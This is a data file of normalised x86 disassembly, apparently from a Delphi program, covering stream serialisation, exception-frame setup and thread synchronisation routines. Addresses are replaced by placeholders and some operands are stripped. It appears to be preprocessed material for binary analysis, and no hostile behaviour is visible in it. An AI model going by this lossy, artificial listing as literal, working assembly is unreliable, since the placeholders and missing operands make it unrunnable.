xor esi esi
mov eax ebx
mov edx edi
call sub_403ea8
jmp r-xdata
mov eax [ ebx ]
call sub_4138f8
test al al
je r-xdata
inc esi
push ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_408be0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41853c
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418857
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_418924
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_418835
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4187f6
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_418948
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_418948
mov eax [ ebp - 0x1c ]
call sub_4134cc
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_418948
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x2
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_418948
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_4184dc
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_418948
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
push 0x1
mov eax [ ebp - 0xc ]
call sub_40304c
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41321c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x74 ] eax
xor eax eax
push ebp
push sub_41879b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_405c24
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x1c ] 0xfffd
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_413c10
xor eax eax
push ebp
push sub_41877b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_413dc8
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418782
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_403104
inc ebx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_413d6c
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_4187cc
call sub_40274c
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_40390c
jmp r-xdata
call sub_4038b8
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_4168d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41883c
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_4187fb
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_416a78
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_4038b8
call sub_40390c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41883c
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0xc ]
call sub_403104
sub_418868
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418912
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4188e5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_418b24
cmp al 0xb
je r-xdata
mov eax ebx
call sub_410a24
mov eax [ eax + 0x1 ]
mov esi [ eax ]
xor ebx ebx
call sub_416bc0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_416bf8
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418919
lea eax [ ebp - 0x8 ]
call sub_403e54
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418948
cmp [ ebp - 0x8 ] 0x0
je r-xdata
bts ebx eax
jmp r-xdata
sub_418948
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_4170e8
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_403f44
mov eax esi
call j_sub_404320#2
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_4170e8
pop edx
pop esi
pop ebx
retn
sub_418984
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_418a31
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4170c4
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_418a40
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4040dc
jmp r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418a38
lea eax [ ebp - 0x8 ]
call sub_404534
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_418b24
sub al 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_4170e8
jmp r-xdata
sub al 0x6
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4044a0
mov edx [ esi ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_4170e8
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_4170e8
jmp r-xdata
jmp r-xdata
call sub_416bc0
sub_418a40
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_418b17
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4170c4
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_418984
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404680
jmp r-xdata
sub al 0x6
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418b1e
lea eax [ ebp - 0xc ]
call sub_403e54
lea eax [ ebp - 0x8 ]
call sub_403e54
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_418b24
sub al 0x12
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_4170e8
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_40477c
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx [ esi ]
mov eax ebx
call sub_4170e8
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_4170e8
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4044a0
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_4170e8
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_4058c4
jmp r-xdata
jmp r-xdata
call sub_416bc0
sub_418b38
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_418b74
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_418948
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418b7b
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_418b80
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_416d80
test al al
je r-xdata
mov eax [ ebx ]
call sub_418c34
mov eax [ ebx ]
call sub_417cec
pop ebx
pop ebp
retn
sub_418ba8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_4170e8
mov edx [ ebp - 0x4 ]
imul edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41902c
pop ebx
pop ecx
pop ebp
retn
sub_418bd8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_416d80
test al al
je r-xdata
mov eax [ ebx ]
call sub_4170c4
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebx ]
call sub_417cec
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edx 0x1
call sub_41902c
jmp r-xdata
mov eax [ ebx ]
call sub_418c34
mov eax [ ebx ]
call sub_416d80
test al al
je r-xdata
mov eax [ ebx ]
call sub_418dd0
mov eax [ ebx ]
call sub_417cec
sub_418c34
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418dc3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_418b24
and eax 0x7f
cmp eax 0x14
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418dca
lea eax [ ebp - 0x8 ]
call sub_403e54
retn
jmp [ eax * 4 + jump_table_418c6b ]
push ebp
call sub_418b80
pop ecx
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_41902c
jmp r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_41902c
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41902c
jmp r-xdata
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_41902c
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418948
jmp r-xdata
push ebp
mov eax 0x1
call sub_418ba8
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_418b38
jmp r-xdata
push ebp
mov eax 0x1
call sub_418ba8
pop ecx
jmp r-xdata
push ebp
call sub_418bd8
pop ecx
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41902c
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41902c
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41902c
jmp r-xdata
push ebp
mov eax 0x2
call sub_418ba8
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41902c
jmp r-xdata
push ebp
mov eax 0x1
call sub_418ba8
pop ecx
sub_418dd0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_418e0d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_418948
mov eax ebx
call sub_418c34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418e14
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_418e18
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_418eb0
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
mov eax ebx
call sub_416d80
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x24 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_418948
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_418948
jmp r-xdata
mov eax ebx
call sub_418dd0
mov eax ebx
call sub_417cec
jmp r-xdata
mov eax ebx
call sub_416d80
test al al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_418e18
mov eax ebx
call sub_417cec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418eb7
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403e78
retn
sub_418ec0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_418f65
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_403eec
xor eax eax
mov [ ebp - 0x4 ] eax
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_419d5c
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418f6c
lea eax [ ebp - 0x8 ]
call sub_403e54
retn
cmp [ ebx + 0x52 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b618
call sub_403890
sub_418f90
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop edi
pop esi
pop ebx
retn
push esi
mov edi eax
mov ecx ebx
mov edx eax
mov eax [ edi + 0x44 ]
call [ edi + 0x40 ]
sub_418fb8
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_417018
mov [ esp ] eax
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax esi
call sub_41340c
mov edx [ r-xdata ]
mov eax [ esp ]
call sub_403330
test al al
jne r-xdata
mov ecx esi
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_417018
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_41902c
push ebx
push esi
add esp 0xffffff00
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
add esp 0x100
pop esi
pop ebx
retn
cmp ebx 0x100
jle r-xdata
mov edx esp
mov ecx ebx
mov eax esi
call sub_4170e8
xor ebx ebx
mov edx esp
mov ecx 0x100
mov eax esi
call sub_4170e8
sub ebx 0x100
jmp r-xdata
test ebx ebx
jg r-xdata
sub_419074
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41921d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xa
call sub_416c4c
xor eax eax
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4191f8
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_4170e8
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_415a48
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_4170e8
push 0x400
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_416508
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4191d3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_418984
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0xc ]
call sub_4170e8
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x8 ]
call sub_415a48
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_4170e8
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_4106c4
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5dc
call sub_403890
lea eax [ ebp - 0x1c ]
call sub_4054f4
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_40d0ac
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x4 ]
mov [ ebx ] ax
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4191da
mov eax [ ebp - 0xc ]
call sub_403104
retn
sub_41923c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419436
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40ec20
mov eax [ ebp - 0x4 ]
call sub_4170c4
and eax 0x7f
cmp eax 0x14
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5dc
call sub_403890
jmp [ eax * 4 + jump_table_41927e ]
mov eax [ ebp - 0x4 ]
call sub_418b24
cmp al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_417c34
mov edx eax
movsx edx dl
mov eax ebx
mov cl 0xff
call sub_40fefc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417c34
mov edx eax
movsx edx dx
mov eax ebx
mov cl 0xfe
call sub_40fefc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417c34
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_40fefc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417a18
mov eax ebx
call sub_40ff8c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417a5c
mov eax ebx
call sub_40ff8c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417aa0
mov eax ebx
call sub_40ffb4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417af0
mov eax ebx
call sub_40ffa0
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418984
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_40ffc8
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_418a40
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_40fff4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_418b24
cmp al 0x9
sete dl
mov eax ebx
call sub_40ff64
jmp r-xdata
push ebp
lea eax [ ebp - 0x1c ]
call sub_419074
pop ecx
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_40ef48
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417ca0
push edx
push eax
mov eax ebx
call sub_40ff38
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41943d
lea eax [ ebp - 0x1c ]
call sub_40ec34
lea eax [ ebp - 0xc ]
call sub_404534
lea eax [ ebp - 0x8 ]
call sub_403e54
retn
mov eax ebx
call sub_4107ac
jmp r-xdata
sub_419444
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
call sub_419490
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_4194bc
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
cmp [ esp ] 0xffffff80
jl r-xdata
cmp [ esp ] 0xffff8000
jl r-xdata
cmp [ esp ] 0x7f
jg r-xdata
mov dl 0x4
mov eax ebx
call sub_41962c
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_419444
cmp [ esp ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax ebx
call sub_41962c
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_419444
pop edx
pop ebx
retn
mov dl 0x3
mov eax ebx
call sub_41962c
mov edx esp
mov ecx 0x2
mov eax ebx
call sub_419444
jmp r-xdata
pop edx
pop ebx
retn
sub_419540
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
mov edx edi
call sub_404260
je r-xdata
mov eax esi
call sub_404114
mov [ esp ] eax
cmp [ esp ] 0xff
jg r-xdata
mov eax edi
call sub_404114
mov [ esp ] eax
mov dl 0x14
mov eax ebx
call sub_41962c
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_419444
mov edx edi
mov ecx [ esp ]
mov eax ebx
call sub_419444
jmp r-xdata
mov dl 0xc
mov eax ebx
call sub_41962c
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_419444
mov dl 0x6
mov eax ebx
call sub_41962c
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_419444
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ esp ]
mov eax ebx
call sub_419444
sub_4195d8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41961d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405968
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_419540
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419624
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_4196b4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
je r-xdata
test ebx ebx
jle r-xdata
call GetCurrentThreadId
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b618
call sub_403890
call sub_41968c
mov eax ebx
call sub_419698
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_419842
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push rw-data
call InterlockedExchange
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_419823
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41982a
mov eax [ ebp - 0xc ]
call sub_403104
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_413d6c
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_413c5c
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_4197ed
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4197be
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call EnterCriticalSection
retn
sub_419854
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov al [ r-xdata ]
mov [ edi + 0x24 ] al
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax edi
test bl bl
je r-xdata
mov edx edi
mov eax esi
call sub_419a0c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_4198a0
push ebx
push esi
push ecx
call sub_403490
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_419af4
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_419a9c
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov dl [ esp ]
and dl 0xfc
mov eax ebx
call sub_4142fc
cmp [ esp ] 0x0
jle r-xdata
mov edx ebx
call sub_419a64
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_403478
